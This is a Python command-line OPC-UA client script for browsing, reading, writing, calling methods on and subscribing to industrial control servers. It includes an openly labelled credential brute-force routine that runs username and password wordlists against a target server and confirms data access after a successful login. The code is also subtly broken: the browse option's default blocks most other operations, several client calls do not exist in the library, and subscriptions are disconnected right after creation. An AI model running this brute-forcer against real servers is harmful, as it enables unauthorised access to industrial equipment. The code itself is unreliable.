#!/usr/bin/env python3
"""
Modern OPC-UA Client Script using python-opcua
A Python script to interact with OPC-UA servers using python-opcua library
Supports browsing, reading, writing, and subscribing to OPC-UA nodes
"""

import asyncio
import argparse
import sys
import time
from typing import Dict, List, Optional, Any, Union, Callable
from dataclasses import dataclass
from enum import Enum
import logging

# Import python-opcua components
try:
    from opcua import Client, ua
    from opcua.common.subscription import Subscription
    from opcua.common.node import Node
    OPCUA_AVAILABLE = True
except ImportError as e:
    print(f"Error: python-opcua not installed or import failed: {e}")
    print("Please install with: pip install opcua")
    sys.exit(1)

class OPCUASecurityMode(Enum):
    """OPC-UA Security Modes"""
    NONE = "None"
    SIGN = "Sign"
    SIGN_AND_ENCRYPT = "SignAndEncrypt"

class OPCUASecurityPolicy(Enum):
    """OPC-UA Security Policies"""
    NONE = "None"
    BASIC128RSA15 = "Basic128Rsa15"
    BASIC256 = "Basic256"
    BASIC256SHA256 = "Basic256Sha256"
    AES128_SHA256_RSAOAEP = "Aes128_Sha256_RsaOaep"
    AES256_SHA256_RSAPSS = "Aes256_Sha256_RsaPss"

@dataclass
class OPCUAServer:
    """Represents an OPC-UA server"""
    url: str
    name: str
    application_uri: str
    product_uri: str
    server_uri: str
    security_policy_uri: str
    security_mode: str
    transport_profile_uri: str

@dataclass
class OPCUANode:
    """Represents an OPC-UA node"""
    node_id: str
    browse_name: str
    display_name: str
    node_class: str
    data_type: Optional[str] = None
    value: Optional[Any] = None
    access_level: Optional[int] = None
    user_access_level: Optional[int] = None

class OPCUAClient:
    """Modern OPC-UA client using python-opcua library"""
    
    def __init__(self, url: str = None, timeout: int = 4, 
                 security_policy: str = "None", security_mode: str = "None",
                 username: str = None, password: str = None,
                 certificate_path: str = None, private_key_path: str = None):
        self.url = url
        self.timeout = timeout
        self.security_policy = security_policy
        self.security_mode = security_mode
        self.username = username
        self.password = password
        self.certificate_path = certificate_path
        self.private_key_path = private_key_path
        
        # OPC-UA client object
        self.client = None
        self.subscriptions = {}
        
        # Configure logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
        
    async def start(self) -> bool:
        """Start the OPC-UA client"""
        try:
            if not self.url:
                self.logger.error("No URL provided")
                return False
                
            # Create client
            self.client = Client(url=self.url, timeout=self.timeout)
            
            # Set security if specified
            if self.security_policy != "None" or self.security_mode != "None":
                if self.certificate_path and self.private_key_path:
                    self.client.set_security_string(f"{self.security_policy},{self.security_mode},{self.certificate_path},{self.private_key_path}")
                else:
                    self.logger.warning("Security policy/mode specified but no certificate provided")
            
            # Set credentials if provided
            if self.username:
                self.client.set_user(self.username)
            if self.password:
                self.client.set_password(self.password)
            
            self.logger.info(f"OPC-UA client configured for {self.url}")
            if self.security_policy != "None":
                self.logger.info(f"Security policy: {self.security_policy}")
            if self.security_mode != "None":
                self.logger.info(f"Security mode: {self.security_mode}")
            
            return True
        except Exception as e:
            self.logger.error(f"Failed to start OPC-UA client: {e}")
            return False
    
    async def connect(self) -> bool:
        """Connect to the OPC-UA server"""
        try:
            if not self.client:
                self.logger.error("Client not initialized")
                return False
            
            self.client.connect()
            self.logger.info("Connected to OPC-UA server")
            return True
        except Exception as e:
            self.logger.error(f"Connection failed: {e}")
            return False
    
    async def disconnect(self) -> None:
        """Disconnect from the OPC-UA server"""
        if self.client:
            try:
                self.client.disconnect()
                self.logger.info("Disconnected from OPC-UA server")
            except Exception as e:
                self.logger.error(f"Error during disconnect: {e}")
    
    async def discover_servers(self) -> List[OPCUAServer]:
        """Discover OPC-UA servers on the network"""
        servers = []
        
        if not await self.connect():
            return servers
        
        try:
            self.logger.info("Discovering OPC-UA servers...")
            
            # Find servers
            found_servers = self.client.find_servers()
            
            for server_info in found_servers:
                server = OPCUAServer(
                    url=server_info.ApplicationUri,
                    name=server_info.ApplicationName.Text,
                    application_uri=server_info.ApplicationUri,
                    product_uri=server_info.ProductUri,
                    server_uri=server_info.ServerUri,
                    security_policy_uri=server_info.SecurityPolicyUri,
                    security_mode=str(server_info.SecurityMode),
                    transport_profile_uri=server_info.TransportProfileUri
                )
                servers.append(server)
                self.logger.info(f"Found server: {server.name} ({server.url})")
            
        except Exception as e:
            self.logger.error(f"Error discovering servers: {e}")
        finally:
            await self.disconnect()
        
        return servers
    
    async def get_endpoints(self) -> List[Dict[str, Any]]:
        """Get server endpoints"""
        endpoints = []
        
        if not await self.connect():
            return endpoints
        
        try:
            self.logger.info("Getting server endpoints...")
            
            server_endpoints = self.client.get_endpoints()
            
            for endpoint in server_endpoints:
                endpoint_info = {
                    'endpoint_url': endpoint.EndpointUrl,
                    'security_policy_uri': endpoint.SecurityPolicyUri,
                    'security_mode': str(endpoint.SecurityMode),
                    'transport_profile_uri': endpoint.TransportProfileUri,
                    'user_token_policies': []
                }
                
                for policy in endpoint.UserIdentityTokens:
                    endpoint_info['user_token_policies'].append({
                        'policy_id': policy.PolicyId,
                        'token_type': str(policy.TokenType),
                        'issued_token_type': policy.IssuedTokenType,
                        'issuer_endpoint_url': policy.IssuerEndpointUrl,
                        'security_policy_uri': policy.SecurityPolicyUri
                    })
                
                endpoints.append(endpoint_info)
                self.logger.info(f"Endpoint: {endpoint.EndpointUrl}")
            
        except Exception as e:
            self.logger.error(f"Error getting endpoints: {e}")
        finally:
            await self.disconnect()
        
        return endpoints
    
    async def browse_nodes(self, node_id: str = "i=84", max_results: int = 100) -> List[OPCUANode]:
        """Browse nodes starting from the specified node ID"""
        nodes = []
        
        if not await self.connect():
            return nodes
        
        try:
            self.logger.info(f"Browsing nodes starting from {node_id}...")
            
            # Get the starting node
            start_node = self.client.get_node(node_id)
            
            # Browse the node
            children = start_node.get_children()
            
            for child in children[:max_results]:
                try:
                    # Get node attributes
                    browse_name = child.get_browse_name()
                    display_name = child.get_display_name()
                    node_class = str(child.get_node_class())
                    
                    # Try to get data type
                    data_type = None
                    try:
                        data_type_node = child.get_data_type()
                        data_type = data_type_node.get_browse_name().Name
                    except:
                        pass
                    
                    # Try to get value
                    value = None
                    try:
                        value = child.get_value()
                    except:
                        pass
                    
                    # Try to get access levels
                    access_level = None
                    user_access_level = None
                    try:
                        access_level = child.get_access_level()
                        user_access_level = child.get_user_access_level()
                    except:
                        pass
                    
                    node = OPCUANode(
                        node_id=str(child.nodeid),
                        browse_name=browse_name.Name,
                        display_name=display_name.Text,
                        node_class=node_class,
                        data_type=data_type,
                        value=value,
                        access_level=access_level,
                        user_access_level=user_access_level
                    )
                    nodes.append(node)
                    
                except Exception as e:
                    self.logger.warning(f"Error processing child node: {e}")
                    continue
            
            self.logger.info(f"Found {len(nodes)} nodes")
            
        except Exception as e:
            self.logger.error(f"Error browsing nodes: {e}")
        finally:
            await self.disconnect()
        
        return nodes
    
    async def read_node(self, node_id: str) -> Optional[OPCUANode]:
        """Read a single node"""
        if not await self.connect():
            return None
        
        try:
            self.logger.info(f"Reading node {node_id}...")
            
            node = self.client.get_node(node_id)
            
            # Get node attributes
            browse_name = node.get_browse_name()
            display_name = node.get_display_name()
            node_class = str(node.get_node_class())
            
            # Try to get data type
            data_type = None
            try:
                data_type_node = node.get_data_type()
                data_type = data_type_node.get_browse_name().Name
            except:
                pass
            
            # Try to get value
            value = None
            try:
                value = node.get_value()
            except:
                pass
            
            # Try to get access levels
            access_level = None
            user_access_level = None
            try:
                access_level = node.get_access_level()
                user_access_level = node.get_user_access_level()
            except:
                pass
            
            opcua_node = OPCUANode(
                node_id=str(node.nodeid),
                browse_name=browse_name.Name,
                display_name=display_name.Text,
                node_class=node_class,
                data_type=data_type,
                value=value,
                access_level=access_level,
                user_access_level=user_access_level
            )
            
            self.logger.info(f"Node read successfully: {opcua_node.browse_name}")
            return opcua_node
            
        except Exception as e:
            self.logger.error(f"Error reading node {node_id}: {e}")
            return None
        finally:
            await self.disconnect()
    
    async def read_nodes(self, node_ids: List[str]) -> List[Optional[OPCUANode]]:
        """Read multiple nodes in one operation"""
        nodes = []
        
        if not await self.connect():
            return [None] * len(node_ids)
        
        try:
            self.logger.info(f"Reading {len(node_ids)} nodes...")
            
            # Get node objects
            node_objects = [self.client.get_node(node_id) for node_id in node_ids]
            
            # Read values in batch
            values = self.client.get_values(node_objects)
            
            for i, node_obj in enumerate(node_objects):
                try:
                    # Get node attributes
                    browse_name = node_obj.get_browse_name()
                    display_name = node_obj.get_display_name()
                    node_class = str(node_obj.get_node_class())
                    
                    # Try to get data type
                    data_type = None
                    try:
                        data_type_node = node_obj.get_data_type()
                        data_type = data_type_node.get_browse_name().Name
                    except:
                        pass
                    
                    # Get value from batch read
                    value = values[i] if i < len(values) else None
                    
                    # Try to get access levels
                    access_level = None
                    user_access_level = None
                    try:
                        access_level = node_obj.get_access_level()
                        user_access_level = node_obj.get_user_access_level()
                    except:
                        pass
                    
                    opcua_node = OPCUANode(
                        node_id=str(node_obj.nodeid),
                        browse_name=browse_name.Name,
                        display_name=display_name.Text,
                        node_class=node_class,
                        data_type=data_type,
                        value=value,
                        access_level=access_level,
                        user_access_level=user_access_level
                    )
                    nodes.append(opcua_node)
                    
                except Exception as e:
                    self.logger.warning(f"Error processing node {node_ids[i]}: {e}")
                    nodes.append(None)
            
            self.logger.info(f"Read {len([n for n in nodes if n is not None])} nodes successfully")
            
        except Exception as e:
            self.logger.error(f"Error reading nodes: {e}")
            nodes = [None] * len(node_ids)
        finally:
            await self.disconnect()
        
        return nodes
    
    async def write_node(self, node_id: str, value: Any) -> bool:
        """Write value to a node"""
        if not await self.connect():
            return False
        
        try:
            self.logger.info(f"Writing value {value} to node {node_id}...")
            
            node = self.client.get_node(node_id)
            node.set_value(value)
            
            self.logger.info("Node write successful")
            return True
            
        except Exception as e:
            self.logger.error(f"Error writing to node {node_id}: {e}")
            return False
        finally:
            await self.disconnect()
    
    async def write_nodes(self, node_ids: List[str], values: List[Any]) -> List[bool]:
        """Write values to multiple nodes in one operation"""
        results = []
        
        if not await self.connect():
            return [False] * len(node_ids)
        
        try:
            self.logger.info(f"Writing values to {len(node_ids)} nodes...")
            
            # Get node objects
            node_objects = [self.client.get_node(node_id) for node_id in node_ids]
            
            # Write values in batch
            self.client.set_values(node_objects, values)
            
            results = [True] * len(node_ids)
            self.logger.info("Batch write successful")
            
        except Exception as e:
            self.logger.error(f"Error writing nodes: {e}")
            results = [False] * len(node_ids)
        finally:
            await self.disconnect()
        
        return results
    
    async def call_method(self, object_node_id: str, method_node_id: str, 
                         arguments: List[Any] = None) -> Optional[Any]:
        """Call a method on an object"""
        if not await self.connect():
            return None
        
        try:
            self.logger.info(f"Calling method {method_node_id} on object {object_node_id}...")
            
            object_node = self.client.get_node(object_node_id)
            method_node = self.client.get_node(method_node_id)
            
            if arguments is None:
                arguments = []
            
            result = object_node.call_method(method_node, *arguments)
            
            self.logger.info("Method call successful")
            return result
            
        except Exception as e:
            self.logger.error(f"Error calling method: {e}")
            return None
        finally:
            await self.disconnect()
    
    async def create_subscription(self, subscription_name: str, 
                                nodes: List[str], period: int = 1000) -> Optional[str]:
        """Create a subscription to monitor nodes"""
        if not await self.connect():
            return None
        
        try:
            self.logger.info(f"Creating subscription '{subscription_name}'...")
            
            # Create subscription handler
            handler = SubscriptionHandler(self.logger)
            
            # Create subscription
            subscription = self.client.create_subscription(period, handler)
            
            # Add nodes to subscription
            for node_id in nodes:
                try:
                    node = self.client.get_node(node_id)
                    subscription.subscribe_data_change(node)
                    self.logger.info(f"Added node {node_id} to subscription")
                except Exception as e:
                    self.logger.warning(f"Failed to add node {node_id} to subscription: {e}")
            
            # Store subscription
            self.subscriptions[subscription_name] = subscription
            
            self.logger.info(f"Subscription '{subscription_name}' created successfully")
            return subscription_name
            
        except Exception as e:
            self.logger.error(f"Error creating subscription: {e}")
            return None
        finally:
            await self.disconnect()
    
    async def delete_subscription(self, subscription_name: str) -> bool:
        """Delete a subscription"""
        try:
            if subscription_name in self.subscriptions:
                subscription = self.subscriptions[subscription_name]
                subscription.delete()
                del self.subscriptions[subscription_name]
                self.logger.info(f"Subscription '{subscription_name}' deleted")
                return True
            else:
                self.logger.warning(f"Subscription '{subscription_name}' not found")
                return False
        except Exception as e:
            self.logger.error(f"Error deleting subscription: {e}")
            return False
    
    async def test_connection(self) -> bool:
        """Test connection to the OPC-UA server"""
        try:
            if not await self.connect():
                return False
            
            # Try to read the root node
            root_node = self.client.get_root_node()
            root_node.get_browse_name()
            
            self.logger.info("Connection test successful")
            return True
            
        except Exception as e:
            self.logger.error(f"Connection test failed: {e}")
            return False
        finally:
            await self.disconnect()
    
    async def get_server_info(self) -> Optional[Dict[str, Any]]:
        """Get server information"""
        if not await self.connect():
            return None
        
        try:
            self.logger.info("Getting server information...")
            
            # Get server node
            server_node = self.client.get_server_node()
            
            # Get server info
            server_info = {
                'server_name': server_node.get_browse_name().Name,
                'server_uri': self.client.get_server_node().get_browse_name().Name,
                'application_uri': self.client.get_application_uri(),
                'product_uri': self.client.get_product_uri(),
                'software_version': self.client.get_software_version(),
                'build_number': self.client.get_build_number(),
                'build_date': self.client.get_build_date()
            }
            
            self.logger.info("Server information retrieved successfully")
            return server_info
            
        except Exception as e:
            self.logger.error(f"Error getting server info: {e}")
            return None
        finally:
            await self.disconnect()
    
    async def brute_force_credentials(self, password_wordlist_path: str, 
                                    username_wordlist_path: str = None,
                                    delay: float = 1.0) -> List[Dict[str, str]]:
        """Brute force OPC-UA server credentials"""
        valid_credentials = []
        
        try:
            # Load password wordlist
            with open(password_wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            self.logger.info(f"Loaded {len(passwords)} passwords from wordlist")
            
            # Load username wordlist if provided
            usernames = ['admin', 'root', 'user', 'operator']  # Default usernames
            if username_wordlist_path:
                try:
                    with open(username_wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                        usernames = [line.strip() for line in f if line.strip()]
                    self.logger.info(f"Loaded {len(usernames)} usernames from wordlist")
                except Exception as e:
                    self.logger.warning(f"Failed to load username wordlist: {e}")
            
            total_attempts = len(usernames) * len(passwords)
            current_attempt = 0
            
            self.logger.info(f"Starting brute force attack with {total_attempts} total attempts")
            self.logger.info(f"Delay between attempts: {delay}s")
            
            for username in usernames:
                for password in passwords:
                    current_attempt += 1
                    
                    self.logger.info(f"Attempt {current_attempt}/{total_attempts}: {username}:{password}")
                    
                    try:
                        # Create a new client instance for each attempt
                        test_client = Client(url=self.url, timeout=self.timeout)
                        test_client.set_user(username)
                        test_client.set_password(password)
                        
                        # Try to connect
                        test_client.connect()
                        
                        # If we get here, authentication was successful
                        self.logger.info(f"✅ SUCCESS: Valid credentials found - {username}:{password}")
                        valid_credentials.append({
                            'username': username,
                            'password': password,
                            'attempt': current_attempt
                        })
                        
                        # Test if we can actually read data
                        try:
                            root_node = test_client.get_root_node()
                            root_node.get_browse_name()
                            self.logger.info(f"✅ Confirmed access - can read server data")
                        except Exception as e:
                            self.logger.warning(f"⚠️ Authentication succeeded but no data access: {e}")
                        
                        test_client.disconnect()
                        
                    except Exception as e:
                        # Authentication failed
                        self.logger.debug(f"❌ Failed: {username}:{password} - {str(e)[:100]}")
                    
                    # Delay between attempts to avoid overwhelming the server
                    if delay > 0:
                        await asyncio.sleep(delay)
            
            if valid_credentials:
                self.logger.info(f"🎉 Brute force completed! Found {len(valid_credentials)} valid credential(s)")
                for cred in valid_credentials:
                    self.logger.info(f"  Username: {cred['username']}, Password: {cred['password']} (attempt #{cred['attempt']})")
            else:
                self.logger.info("❌ No valid credentials found")
            
            return valid_credentials
            
        except Exception as e:
            self.logger.error(f"Error during brute force attack: {e}")
            return valid_credentials
    
    async def stop(self) -> None:
        """Stop the OPC-UA client"""
        # Delete all subscriptions
        for subscription_name in list(self.subscriptions.keys()):
            await self.delete_subscription(subscription_name)
        
        await self.disconnect()
        self.logger.info("OPC-UA client stopped")

class SubscriptionHandler:
    """Handler for OPC-UA subscriptions"""
    
    def __init__(self, logger):
        self.logger = logger
    
    def datachange_notification(self, node, val, data):
        """Called when data changes in subscribed nodes"""
        self.logger.info(f"Data change notification - Node: {node.get_browse_name().Name}, Value: {val}")
    
    def event_notification(self, event):
        """Called when events occur in subscribed nodes"""
        self.logger.info(f"Event notification - Event: {event}")

async def main():
    """Main async function demonstrating OPC-UA client usage"""
    parser = argparse.ArgumentParser(description='Modern OPC-UA Client Demo using python-opcua')
    parser.add_argument('--url', required=True,
                       help='OPC-UA server URL (e.g., opc.tcp://localhost:4840)')
    parser.add_argument('--timeout', type=int, default=4,
                       help='Connection timeout in seconds (default: 4)')
    parser.add_argument('--security-policy', choices=['None', 'Basic128Rsa15', 'Basic256', 'Basic256Sha256'],
                       default='None', help='Security policy (default: None)')
    parser.add_argument('--security-mode', choices=['None', 'Sign', 'SignAndEncrypt'],
                       default='None', help='Security mode (default: None)')
    parser.add_argument('--username', help='Username for authentication')
    parser.add_argument('--password', help='Password for authentication')
    parser.add_argument('--certificate', help='Path to client certificate')
    parser.add_argument('--private-key', help='Path to client private key')
    
    # Operation arguments
    parser.add_argument('--discover-servers', action='store_true',
                       help='Discover OPC-UA servers on the network')
    parser.add_argument('--get-endpoints', action='store_true',
                       help='Get server endpoints')
    parser.add_argument('--test-connection', action='store_true',
                       help='Test connection to server')
    parser.add_argument('--get-server-info', action='store_true',
                       help='Get server information')
    parser.add_argument('--browse', nargs='?', const="i=84", default="i=84",
                       help='Browse nodes starting from node ID (default: i=84). Common node IDs: i=84 (Root), i=85 (Objects), i=86 (Types), i=87 (Views), i=88 (Methods)')
    parser.add_argument('--read-node', help='Read a single node by node ID')
    parser.add_argument('--read-nodes', help='Read multiple nodes (comma-separated node IDs)')
    parser.add_argument('--write-node', help='Write to a node (format: node_id,value)')
    parser.add_argument('--write-nodes', help='Write to multiple nodes (format: node_id1,value1,node_id2,value2,...)')
    parser.add_argument('--call-method', help='Call a method (format: object_node_id,method_node_id,arg1,arg2,...)')
    parser.add_argument('--create-subscription', help='Create subscription (format: name,node_id1,node_id2,...)')
    parser.add_argument('--delete-subscription', help='Delete subscription by name')
    parser.add_argument('--password-wordlist', help='Path to password wordlist file for brute force testing')
    parser.add_argument('--username-wordlist', help='Path to username wordlist file for brute force testing (optional)')
    parser.add_argument('--brute-force-delay', type=float, default=1.0,
                       help='Delay between brute force attempts in seconds (default: 1.0)')
    parser.add_argument('--max-results', type=int, default=100,
                       help='Maximum number of results for browse operations (default: 100)')
    
    args = parser.parse_args()
    
    print("Modern OPC-UA Client Demo using python-opcua")
    print("=" * 50)
    print(f"Server URL: {args.url}")
    print(f"Timeout: {args.timeout}s")
    print(f"Security Policy: {args.security_policy}")
    print(f"Security Mode: {args.security_mode}")
    
    # Create client
    client = OPCUAClient(
        url=args.url,
        timeout=args.timeout,
        security_policy=args.security_policy,
        security_mode=args.security_mode,
        username=args.username,
        password=args.password,
        certificate_path=args.certificate,
        private_key_path=args.private_key
    )
    
    # Start the client
    if not await client.start():
        print("Failed to start OPC-UA client")
        return
    
    try:
        # Discover servers
        if args.discover_servers:
            print(f"\nDiscovering OPC-UA servers...")
            servers = await client.discover_servers()
            if servers:
                print(f"Found {len(servers)} server(s):")
                for server in servers:
                    print(f"  Name: {server.name}")
                    print(f"  URL: {server.url}")
                    print(f"  Security Policy: {server.security_policy_uri}")
                    print(f"  Security Mode: {server.security_mode}")
                    print()
            else:
                print("No servers found")
        
        # Get endpoints
        elif args.get_endpoints:
            print(f"\nGetting server endpoints...")
            endpoints = await client.get_endpoints()
            if endpoints:
                print(f"Found {len(endpoints)} endpoint(s):")
                for i, endpoint in enumerate(endpoints):
                    print(f"  Endpoint {i+1}: {endpoint['endpoint_url']}")
                    print(f"    Security Policy: {endpoint['security_policy_uri']}")
                    print(f"    Security Mode: {endpoint['security_mode']}")
                    print()
            else:
                print("No endpoints found")
        
        # Test connection
        elif args.test_connection:
            print(f"\nTesting connection to {args.url}...")
            success = await client.test_connection()
            print(f"Connection test {'successful' if success else 'failed'}")
        
        # Get server info
        elif args.get_server_info:
            print(f"\nGetting server information...")
            info = await client.get_server_info()
            if info:
                print("Server Information:")
                for key, value in info.items():
                    print(f"  {key}: {value}")
            else:
                print("Failed to get server information")
        
        # Browse nodes
        elif args.browse:
            start_node = args.browse if args.browse else "i=84"
            print(f"\nBrowsing nodes starting from {start_node}...")
            nodes = await client.browse_nodes(start_node, args.max_results)
            if nodes:
                print(f"Found {len(nodes)} node(s):")
                for node in nodes:
                    print(f"  Node ID: {node.node_id}")
                    print(f"  Browse Name: {node.browse_name}")
                    print(f"  Display Name: {node.display_name}")
                    print(f"  Node Class: {node.node_class}")
                    if node.data_type:
                        print(f"  Data Type: {node.data_type}")
                    if node.value is not None:
                        print(f"  Value: {node.value}")
                    print()
            else:
                print("No nodes found")
        
        # Read single node
        elif args.read_node:
            print(f"\nReading node {args.read_node}...")
            node = await client.read_node(args.read_node)
            if node:
                print("Node Information:")
                print(f"  Node ID: {node.node_id}")
                print(f"  Browse Name: {node.browse_name}")
                print(f"  Display Name: {node.display_name}")
                print(f"  Node Class: {node.node_class}")
                if node.data_type:
                    print(f"  Data Type: {node.data_type}")
                if node.value is not None:
                    print(f"  Value: {node.value}")
                if node.access_level is not None:
                    print(f"  Access Level: {node.access_level}")
                if node.user_access_level is not None:
                    print(f"  User Access Level: {node.user_access_level}")
            else:
                print("Failed to read node")
        
        # Read multiple nodes
        elif args.read_nodes:
            node_ids = args.read_nodes.split(',')
            print(f"\nReading {len(node_ids)} nodes...")
            nodes = await client.read_nodes(node_ids)
            if nodes:
                print("Nodes Information:")
                for i, node in enumerate(nodes):
                    if node:
                        print(f"  Node {i+1}:")
                        print(f"    Node ID: {node.node_id}")
                        print(f"    Browse Name: {node.browse_name}")
                        print(f"    Display Name: {node.display_name}")
                        print(f"    Node Class: {node.node_class}")
                        if node.data_type:
                            print(f"    Data Type: {node.data_type}")
                        if node.value is not None:
                            print(f"    Value: {node.value}")
                        print()
                    else:
                        print(f"  Node {i+1}: Failed to read")
            else:
                print("Failed to read nodes")
        
        # Write single node
        elif args.write_node:
            try:
                node_id, value = args.write_node.split(',', 1)
                print(f"\nWriting value {value} to node {node_id}...")
                success = await client.write_node(node_id, value)
                print(f"Write {'successful' if success else 'failed'}")
            except ValueError:
                print("Invalid format. Use: node_id,value")
        
        # Write multiple nodes
        elif args.write_nodes:
            try:
                parts = args.write_nodes.split(',')
                if len(parts) % 2 != 0:
                    raise ValueError("Must have even number of values")
                
                node_ids = parts[::2]
                values = parts[1::2]
                
                print(f"\nWriting values to {len(node_ids)} nodes...")
                results = await client.write_nodes(node_ids, values)
                success_count = sum(results)
                print(f"Write successful for {success_count}/{len(node_ids)} nodes")
            except ValueError as e:
                print(f"Invalid format: {e}")
                print("Use: node_id1,value1,node_id2,value2,...")
        
        # Call method
        elif args.call_method:
            try:
                parts = args.call_method.split(',')
                if len(parts) < 2:
                    raise ValueError("Must have at least object_node_id and method_node_id")
                
                object_node_id = parts[0]
                method_node_id = parts[1]
                arguments = parts[2:] if len(parts) > 2 else []
                
                print(f"\nCalling method {method_node_id} on object {object_node_id}...")
                result = await client.call_method(object_node_id, method_node_id, arguments)
                if result is not None:
                    print(f"Method call successful, result: {result}")
                else:
                    print("Method call failed")
            except ValueError as e:
                print(f"Invalid format: {e}")
                print("Use: object_node_id,method_node_id,arg1,arg2,...")
        
        # Create subscription
        elif args.create_subscription:
            try:
                parts = args.create_subscription.split(',')
                if len(parts) < 2:
                    raise ValueError("Must have at least subscription name and one node ID")
                
                subscription_name = parts[0]
                node_ids = parts[1:]
                
                print(f"\nCreating subscription '{subscription_name}'...")
                result = await client.create_subscription(subscription_name, node_ids)
                if result:
                    print(f"Subscription '{result}' created successfully")
                    print("Press Ctrl+C to stop monitoring...")
                    
                    # Keep the connection alive for subscription monitoring
                    try:
                        while True:
                            await asyncio.sleep(1)
                    except KeyboardInterrupt:
                        print("\nStopping subscription monitoring...")
                else:
                    print("Failed to create subscription")
            except ValueError as e:
                print(f"Invalid format: {e}")
                print("Use: subscription_name,node_id1,node_id2,...")
        
        # Delete subscription
        elif args.delete_subscription:
            print(f"\nDeleting subscription '{args.delete_subscription}'...")
            success = await client.delete_subscription(args.delete_subscription)
            print(f"Subscription deletion {'successful' if success else 'failed'}")
        
        # Brute force credentials
        elif args.password_wordlist:
            print(f"\nStarting brute force attack...")
            print(f"Password wordlist: {args.password_wordlist}")
            if args.username_wordlist:
                print(f"Username wordlist: {args.username_wordlist}")
            print(f"Delay between attempts: {args.brute_force_delay}s")
            
            valid_credentials = await client.brute_force_credentials(
                password_wordlist_path=args.password_wordlist,
                username_wordlist_path=args.username_wordlist,
                delay=args.brute_force_delay
            )
            
            if valid_credentials:
                print(f"\n🎉 Brute force attack completed!")
                print(f"Found {len(valid_credentials)} valid credential(s):")
                for cred in valid_credentials:
                    print(f"  Username: {cred['username']}")
                    print(f"  Password: {cred['password']}")
                    print(f"  Found on attempt: {cred['attempt']}")
                    print()
            else:
                print(f"\n❌ No valid credentials found")
        
        else:
            print("\nNo operation specified. Use --help to see available options.")
            print("\nExample usage:")
            print("  # Browse from root (default)")
            print("  python opcua_client.py --url opc.tcp://localhost:4840 --browse")
            print("  # Browse from Objects folder")
            print("  python opcua_client.py --url opc.tcp://localhost:4840 --browse i=85")
            print("  # Browse from Types folder")
            print("  python opcua_client.py --url opc.tcp://localhost:4840 --browse i=86")
            print("  # Read a specific node")
            print("  python opcua_client.py --url opc.tcp://localhost:4840 --read-node i=84")
            print("  # Write to a node")
            print("  python opcua_client.py --url opc.tcp://localhost:4840 --write-node i=84,123")
            print("  # Discover servers")
            print("  python opcua_client.py --url opc.tcp://localhost:4840 --discover-servers")
            print("  # Brute force credentials")
            print("  python opcua_client.py --url opc.tcp://localhost:4840 --password-wordlist passwords.txt")
        
        print("\nDemo completed!")
        
    except KeyboardInterrupt:
        print("\nInterrupted by user")
    finally:
        await client.stop()

if __name__ == "__main__":
    asyncio.run(main()) 